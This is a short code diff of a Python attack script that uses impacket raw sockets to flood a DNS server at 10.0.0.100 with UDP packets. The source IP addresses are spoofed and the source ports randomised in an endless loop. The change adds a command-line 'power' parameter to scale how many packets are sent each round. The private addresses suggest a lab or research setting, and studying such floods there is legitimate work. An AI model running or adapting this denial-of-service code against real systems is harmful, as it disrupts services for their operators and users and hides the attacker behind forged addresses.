@@ -3,11 +3,12 @@ from random import randint
 import time
 from impacket import ImpactPacket 
 import pdb
+import sys
 
 SERVER_ADDR = "10.0.0.100"
 PORT = 53
 PAYLOAD = 32
-
+power = int(sys.argv[1])
 
 adversarySocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
 adversarySocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -22,7 +23,7 @@ udp.contains(ImpactPacket.Data(message))
 ip.contains(udp)
 
 while (True):
-	for i in range(50):
+	for i in range(power):
 		i = randint(50000, 60000)
 		udp.set_uh_sport(i)
 		ip.set_ip_src('10.0.0.' + str(randint(1, 5)))
